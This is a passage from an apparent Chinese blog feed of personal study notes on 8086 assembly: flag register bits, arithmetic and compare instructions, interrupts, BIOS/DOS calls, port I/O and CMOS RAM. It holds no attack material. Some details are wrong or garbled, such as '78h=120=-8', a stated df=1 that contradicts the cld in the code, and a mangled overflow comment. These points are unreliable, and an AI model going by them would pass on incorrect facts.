标志寄存器"></a>11. 标志寄存器</h1><p>标志寄存器作用：</p><ol><li>用来存储相关指令的某些执行结果</li><li>用来为CPU执行相关指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ol><p>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。</p><div class="table-container"><table><thead><tr><th>15</th><th>14</th><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td>OF</td><td>DF</td><td>IF</td><td>TF</td><td>SF</td><td>ZF</td><td></td><td>AF</td><td></td><td>PF</td><td></td><td>CF</td></tr></tbody></table></div><p>8086中flag寄存器只有标注的这些位有特殊的含义，其它8086CPU没有使用。</p><h2 id="11-1-ZF标志"><a href="#11-1-ZF标志" class="headerlink" title="11.1 ZF标志"></a>11.1 ZF标志</h2><p>flag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果为0，ZF=1；否则ZF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>执行后，(ax)=0，ZF=1</p><h2 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a>11.2 PF标志</h2><p>flag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，PF=1；否则PF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure><p>执行后，结果为11=00001011B，其中有3个1，PF=0</p><h2 id="11-3-SF标志"><a href="#11-3-SF标志" class="headerlink" title="11.3 SF标志"></a>11.3 SF标志</h2><p>flag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，SF=1；否则SF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B;al=-127</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure><p>结果：(al)=10000010B，SF=1</p><h2 id="11-4-CF标志"><a href="#11-4-CF标志" class="headerlink" title="11.4 CF标志"></a>11.4 CF标志</h2><p>flag的第0位是CF，进位标志位。一般情况下，在进行<strong>无符号数运算</strong>时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位借位。</p><div class="table-container"><table><thead><tr><th></th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td></tr><tr><td>假想的更高位</td><td>最高有效位</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>当两数相加时，有可能产生从最高有效位向更高位的进位。CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。8086CPU就用flag的CF位来记录这个进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al;98h+98h=130h=0001 0011 0000B</span><br></pre></td></tr></table></figure><p>执行后，(al)=30H，CF=1，CF记录了从最高有效位向更高位的进位值。</p><h2 id="11-5-OF标志"><a href="#11-5-OF标志" class="headerlink" title="11.5 OF标志"></a>11.5 OF标志</h2><p>flag的第11位是OF，溢出标志位。一般情况下，OF记录了<strong>有符号数运算</strong>的结果是否发生了溢出。如果发生溢出，OF=1；否则OF=0。</p><p>对于8位的有符号数据，机器所能表示的范围就是-128~127；对于16位的有符号数据，机器所能表示的范围是-32768~32767。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0F0H;0f0h=240=-16240-128*2=-16</span><br><span class="line">add al,78H;78h=120=-8</span><br></pre></td></tr></table></figure><p>执行后，对于无符号运算，0F0H+78H=168H=0001 0110 1000B，CF=1；对于有符号数，-16-8=-24，OF=0。</p><h2 id="11-6-adc指令"><a href="#11-6-adc指令" class="headerlink" title="11.6 adc指令"></a>11.6 adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1+操作对象2+CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2;(ax)=2</span><br><span class="line">mov bx,1;(bx)=1</span><br><span class="line">sub bx,ax;(bx)=-1=FFFFHCF=1</span><br><span class="line">adc ax,1;(ax)=(ax)+1+CF=4</span><br></pre></td></tr></table></figure><h2 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a>11.7 sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1-操作对象2-CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H;(bx)=1000h</span><br><span class="line">mov ax,003EH;(ax)=003eh</span><br><span class="line">sub bx,2000H;(bx)=1000h-2000h=F000HCF=1</span><br><span class="line">sbb ax,0020H;(ax)=(ax)-20h-1=1D</span><br></pre></td></tr></table></figure><h2 id="11-8-cmp指令"><a href="#11-8-cmp指令" class="headerlink" title="11.8 cmp指令"></a>11.8 cmp指令</h2><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>计算操作对象1-操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8;(ax)=8</span><br><span class="line">mov bx,3;(bx)=3</span><br><span class="line">cmp ax,bx;(ax)-(bx)=5=0101b</span><br></pre></td></tr></table></figure><p>指令执行后，零标志位ZF=0，奇偶标志位PF=1，符号标志位SF=0，进位标志位CF=0，溢出标志位OF=0</p><p>如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正；反之亦然。</p><h2 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a>11.9 检测比较结果的条件转移指令</h2><p>除了jcxz指令外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位，根据检测结果来决定是否修改IP。这些条件转移指令通常和cmp相配合使用，类似call和ret配合。</p><p>因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测ZF、CF的值)和根据有符号数的比较结果进行转移的条件转移指令(SF、OF、ZF)。</p><p>常用的根据无符号数的比较结果进行转移的条件转移指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>全称</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>jump equal</td><td>等于则转移</td><td>zf=1</td></tr><tr><td>jne</td><td>jump not equal</td><td>不等于则转移</td><td>zf=0</td></tr><tr><td>jb</td><td>jump below</td><td>低于则转移</td><td>cf=1</td></tr><tr><td>jnb</td><td>jmp not below</td><td>不低于则转移</td><td>cf=0</td></tr><tr><td>ja</td><td>jump above</td><td>高于则转移</td><td>cf=0且zf=0</td></tr><tr><td>jna</td><td>jump not above</td><td>不高于则转移</td><td>cf=1或zf=1</td></tr><tr><td>jz</td><td>jump zero</td><td>零则转移</td><td>zf=1</td></tr><tr><td>jnz</td><td>jump not zero</td><td>非零则转移</td><td>zf=0</td></tr></tbody></table></div><p>编程统计data段中数值为8的字节的个数，用ax保存统计结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db 8,11,8,1,8,5,63,38</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0;ds:bx指向第一个字节</span><br><span class="line">mov ax,0;初始化累加器</span><br><span class="line">mov cx,8</span><br><span class="line">s:cmp byte ptr [bx],8;和8进行比较</span><br><span class="line">jne next;如果不相等则转到next，继续循环</span><br><span class="line">inc ax;如果相等将计数加1</span><br><span class="line">next:inc bx</span><br><span class="line">loop s;程序执行后(ax)=3</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="11-10-DF标志和串传送指令"><a href="#11-10-DF标志和串传送指令" class="headerlink" title="11.10 DF标志和串传送指令"></a>11.10 DF标志和串传送指令</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。</p><p>df=0    每次操作后si、di递增；</p><p>df=1    每次操作后si、di递减。</p><h3 id="11-10-1-串传送指令"><a href="#11-10-1-串传送指令" class="headerlink" title="11.10.1 串传送指令"></a>11.10.1 串传送指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsb</span><br></pre></td></tr></table></figure><p>执行movsb指令相当于进行下面操作：</p><ol><li><p>((es)<em>16+(di))=((ds)\</em>16+(si))</p></li><li><p>如果df=0则 (si)=(si)+1;(di)=(di)+1</p><p>如果df=1则 (si)=(si)-1;(di)=(di)-1</p></li></ol><p>movsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df的值，将si和递增或递减。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsw</span><br></pre></td></tr></table></figure><p>movsw的功能是将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和递增2或递减2。</p><p>movsb和movsw进行的是串传送操作的一个步骤，一般来说，movsb和movsw都和rep配合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep movsb</span><br></pre></td></tr></table></figure><p>用汇编语法来描述就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>rep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减后一个或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。</p><p>由于df位决定着串传送指令执行后si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使人能够决定传送的方向。</p><p>8086CPU提供下面两条指令对df位进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cld指令:将标志寄存器的df位置0</span><br><span class="line">std指令:将标志寄存器的df位置1</span><br></pre></td></tr></table></figure><p>编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">db 16 dup (0)</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>①传送的原始位置：ds:si    data:0</p><p>②传送的目的位置：es:di    data:10h</p><p>③传送的长度：cx                (cx)=16</p><p>④传送的方向：df                df=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0;ds:si指向data:0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,16;es:di指向data:0010</span><br><span class="line">mov cx,16</span><br><span class="line">cld;df=0,正向传送</span><br><span class="line">rep movsb</span><br></pre></td></tr></table></figure><h2 id="11-11-pushf和popf"><a href="#11-11-pushf和popf" class="headerlink" title="11.11 pushf和popf"></a>11.11 pushf和popf</h2><p>pushf的功能是将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。</p><h1 id="12-内中断"><a href="#12-内中断" class="headerlink" title="12. 内中断"></a>12. 内中断</h1><p>任何一个通用的CPU，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。中断的意思是CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。</p><p>对于8086CPU，当内部有下面的情况发生的时候将产生相应的中断信息：</p><ol><li>除法错误，比如执行div指令产生的除法溢出    0</li><li>单步执行                                                               1</li><li>执行into指令                                                        4</li><li>执行int指令，该指令的格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码</li></ol><h2 id="12-1-中断处理程序"><a href="#12-1-中断处理程序" class="headerlink" title="12.1 中断处理程序"></a>12.1 中断处理程序</h2><p>CPU收到中断信息后，应该转去执行该中断信息的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。中断向量表在0000:0000~0000:03FF的1024个单元存放着。在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。</p><h2 id="12-2-中断过程"><a href="#12-2-中断过程" class="headerlink" title="12.2 中断过程"></a>12.2 中断过程</h2><p>用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为中断过程。</p><p>中断过程：</p><ol><li>(从中断信息中)取得中断类型码N</li><li>标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)  pushf</li><li>设置标志寄存器的第8位TF和第9位IF为0  TF=0，IF=0</li><li>CS的内容入栈   push CS</li><li>IP的内容入栈    push IP</li><li>从内存地址为中断类型码<em>4 和中断类型码\</em>4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS   (IP)=(N*4)，(CS)=(N*4+2)</li></ol><h2 id="12-3-中断处理程序和iret指令"><a href="#12-3-中断处理程序和iret指令" class="headerlink" title="12.3 中断处理程序和iret指令"></a>12.3 中断处理程序和iret指令</h2><p>中断处理程序的编写步骤：</p><ol><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用iret指令返回</li></ol><p>iret指令的功能用汇编语法描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><p>iret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。</p><h2 id="12-4-单步中断"><a href="#12-4-单步中断" class="headerlink" title="12.4 单步中断"></a>12.4 单步中断</h2><p>CPU在执行完一条指令后，如果检测到标志寄存器的TF=1，则产生单步中断，引发中断过程。</p><h1 id="13-int指令"><a href="#13-int指令" class="headerlink" title="13. int指令"></a>13. int指令</h1><p>int n也是内中断的一种。</p><h2 id="13-1-BIOS中断例程"><a href="#13-1-BIOS中断例程" class="headerlink" title="13.1 BIOS中断例程"></a>13.1 BIOS中断例程</h2><p>int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。</p><p>(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置。</p><p>(ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数。</p><p>bl中的颜色属性的格式如下：</p><div class="table-container"><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>BL</td><td>R</td><td>G</td><td>B</td><td>I</td><td>R</td><td>G</td><td>B</td></tr><tr><td>闪烁</td><td></td><td>4~6背景</td><td></td><td>高亮</td><td></td><td>0~2前景</td></tr></tbody></table></div><p>编程，在屏幕的5行12列显示3个红底高亮闪烁绿色的’a’。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ah,9;在光标位置显示字符</span><br><span class="line">mov al,&#x27;a&#x27;;字符</span><br><span class="line">mov bl,11001010b;颜色属性</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov cx,3;字符重复个数</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="13-2-DOS中断例程"><a href="#13-2-DOS中断例程" class="headerlink" title="13.2 DOS中断例程"></a>13.2 DOS中断例程</h2><p>int 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。</p><p>前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch;程序返回</span><br><span class="line">mov al,0;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。</p><p>编程，在屏幕的5行12列显示字符串“Welcome to masm!”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov dx,0;ds:dx指向字符串的首地址data:0</span><br><span class="line">mov ah,9</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="14-端口"><a href="#14-端口" class="headerlink" title="14. 端口"></a>14. 端口</h1><p>在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下三种芯片</p><ol><li>各种接口卡(网卡、显卡)上的接口芯片，它们控制接口卡进行工作</li><li>主板上的接口芯片，CPU通过它们对部分外设进行访问</li><li>其他芯片，用来存储相关的系统信息，或进行相关的出入输出处理</li></ol><p>从CPU的角度，将寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。</p><p>CPU可以直接读写以下3个地方的数据：</p><ol><li>CPU内部的寄存器</li><li>内存单元</li><li>端口</li></ol><h2 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h2><p>因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口，端口地址的范围为0~65535</p><p>端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。</p><p><strong>访问内存：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[8];假设执行前(ds)=0</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息8发出</p><p>②CPU通过控制线发出内存读命令，选中存储器芯片并通知它将要从中读取数据</p><p>③存储器将8号单元中的数据通过数据线送入CPU</p><p><strong>访问端口：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in al,60h;从60h号端口读入一个字节</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息60h发出</p><p>②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据</p><p>③端口所在的芯片将60h端口中的数据通过数据线送入CPU</p><p>注：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位时用ax。</p><p>对0~255以内的端口进行读写时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h;从20h端口读入一个字节</span><br><span class="line">out 20h,al;往20h端口写入一个字节</span><br></pre></td></tr></table></figure><p>对256~65535的端口进行读写时，端口号放在dx中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h;将端口号3f8h送入dx</span><br><span class="line">in al,dx;从3f8h端口读入一个字节</span><br><span class="line">out dx,al;往3f8h端口写入一个字节</span><br></pre></td></tr></table></figure><h2 id="14-2-shl和shr指令"><a href="#14-2-shl和shr指令" class="headerlink" title="14.2 shl和shr指令"></a>14.2 shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><p>shl是逻辑左移指令，它的功能为：</p><ul><li>将一个寄存器或内存单元中的数据向左移位</li><li>将最后移出的一位写入CF中</li><li>最低位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1;将al中的数据左移一位</span><br></pre></td></tr></table></figure><p>执行后(al)=10010000b，CF=0</p><p>shr是逻辑右移指令：</p><ul><li>将一个寄存器或内存单元中的数据向右移位</li><li>将最后移出的一位写入CF中</li><li>最高位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001b</span><br><span class="line">shr al,1</span><br></pre></td></tr></table></figure><p>执行后(al)=01000000b，CF=1</p><h2 id="14-3-CMOS-RAM芯片"><a href="#14-3-CMOS-RAM芯片" class="headerlink" title="14.3 CMOS RAM芯片"></a>14.3 CMOS RAM芯片</h2><p>CMOS特征：</p><ol><li>包含一个实时钟和一个有128个存储单元的RAM存储器</li><li>该芯片靠电池供电，关机后其内部的实时钟仍可正常工作，RAM中的信息不丢失</li><li>128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。</li><li>芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口读写CMOS</li><li>70h为地址端口，存放要访问的CMOS RAM单元的地址；71h为数据端口，存放从选定的CMOS单元中读取的数据，或要写入到其中的数据。CPU对CMOS的读写分两步进行，读CMOS的2号单元：①将2送入端口70h；②从端口71h读出2号单元的内容</li></ol><p>在CMOS中，存放这当前的时间：年、月、日、时、分、秒。这6个信息的长度都为1个字节。存放单元为：秒：0        分：2        时：4        日：7        月：8        年：9</p><p>这些数据以BCD码的方式存放。BCD码是以4位二进制数表示十进制数码的编码方法。数值26，用BCD码表示为：0010 0110</p><p>1个字节表示2个BCD码，高4位的BCD码表示十位，低4位的BCD码表示个位。</p><p>编程，在屏幕中间显示当前的月份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:mov al,8</span><br><span class="line">out 70h,al;从8号单元读出当前月份的BCD码</span><br><span class="line">in al,71h;从数据端口71h中取得指定单元中的数据</span><br><span class="line"></span><br><span class="line">mov ah,al;al中为从CMOS的8号单元中读出的数据</span><br><span class="line">mov cl,4</span><br><span class="line">shr ah,cl;ah中为月份的十位数码值</span><br><span class="line">and al,00001111b;al中为月份的个位数码值</span><br><span class="line"></span><br><span class="line">add ah,30h</span><br><span class="line">add al,30h;显示对应的ASCII码字符</span><br><span class="line"></span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov byte ptr es:[160*12+40*2],ah;显示月份的十位数码</span><br><span class="line">mov byte ptr es:[160*12+40*2+2],al;显示月份的个位数码</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="15-外中断"><a href="#15-外中断" class="headerlink" title="15. 外中断"></a>15. 外中断</h1><p>外设输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关芯片送到外设。</p><p>在PC系统中，外中断源一共有以下两类：</p><ol><li>可屏蔽中断</li></ol><p>可屏蔽中断是CPU可以不响应的外中断。CPU是否响应要看标志寄存器的IF位。如果IF=1，CPU在执行完当前指令后响应中断，引发中断过程；如果IF=0，不响应可屏蔽中断。</p><p>8086CPU提供设置IF的指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sti;设置IF=1</span><br><span class="line">cli;设置IF=0</span><br></pre></td></tr></table></figure><ol><li>不可屏蔽中断</li></ol><p>不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU，不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：</p><p>①标志寄存器入栈，IF=0，TF=0</p><p>②CS、IP入栈</p><p>③(IP)=8，(CS)=(0ah)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="汇编" scheme="http://example.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>pwn基础入门</title>
    <link href="http://example.com/posts/1c971db4.html"/>
    <id>http://example.com/posts/1c971db4.html</id>
    <published>2022-04-10T06:27:13.698Z</published>
    <updated>2022-04-11T05:24:58.920Z</updated>
    
